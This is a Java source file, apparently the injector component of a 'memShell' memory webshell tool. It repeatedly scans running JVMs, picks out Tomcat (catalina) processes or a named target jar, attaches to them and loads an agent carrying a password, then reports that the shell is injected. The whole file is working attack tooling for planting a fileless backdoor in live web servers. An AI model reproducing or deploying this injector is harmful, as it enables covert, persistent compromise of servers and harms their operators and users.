package org.memShell;

import java.io.File;
import java.util.List;
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

public class Attach {
  public static void main(String[] args) throws Exception {

    if (args.length < 1 || args.length > 2) {
      System.out.println("Usage\n"
          + " Windows: java -cp \"%JAVA_HOME%\\lib\\tools.jar\";memShell.jar org.memShell.Attach password [target jar name]\n"
          + " Linux:   java -cp $JAVA_HOME/lib/tools.jar:memShell.jar org.memShell.Attach password [target jar name]\n");
      return;
    }
    VirtualMachine vm = null;
    List<VirtualMachineDescriptor> vmList = null;
    String password = args[0];
    String jar = args.length > 1 ? args[1] : "";
    String currentPath = Attach.class.getProtectionDomain().getCodeSource().getLocation().getPath();
    String agentFile = new File(currentPath).getCanonicalPath();
    currentPath = currentPath.substring(0, currentPath.lastIndexOf("/") + 1);
    String agentArgs = currentPath;
    String classPath = System.getProperty("java.class.path");
    String classPath2;
    int index = 0;
    if (System.getProperties().getProperty("os.name").equals("Linux")) {
      index = classPath.lastIndexOf(":");
      classPath2 = classPath.substring(0, index);
    } else {
      index = classPath.lastIndexOf(";");
      classPath2 = classPath.substring(0, index);
    }
    agentArgs = agentArgs + "^^" + classPath2;
    agentArgs = agentArgs + "^^" + password;
    agentArgs = agentArgs + "^^" + jar;

    while (true) {
      try {
        vmList = VirtualMachine.list();
        if (vmList.size() <= 0)
          continue;
        for (VirtualMachineDescriptor vmd : vmList) {
          if (vmd.displayName().indexOf("org.memShell.Attach") == -1
              && (vmd.displayName().indexOf("catalina") >= 0 || vmd.displayName().equals("")
                  || (!jar.isEmpty() && vmd.displayName().indexOf(jar) >= 0))) {
            vm = VirtualMachine.attach(vmd);

            if (vmd.displayName().equals("")
                && vm.getSystemProperties().containsKey("catalina.home") == false)
              continue;

            System.out.println("[+]OK.i find a jvm.");
            if (classPath.substring(index + 1).toUpperCase().indexOf("TEMP") >= 0
                || classPath.substring(index + 1).toUpperCase().indexOf("TMP") >= 0) {
              Thread.sleep(60000);
            } else {
              Thread.sleep(1000);
            }

            if (null != vm) {
              vm.loadAgent(agentFile, agentArgs);
              System.out.println("[+]memeShell is injected.");
              vm.detach();
              return;
            }
          }
        }
        Thread.sleep(3000);
      } catch (Exception e) {
        e.printStackTrace();
      }
    }
  }
}
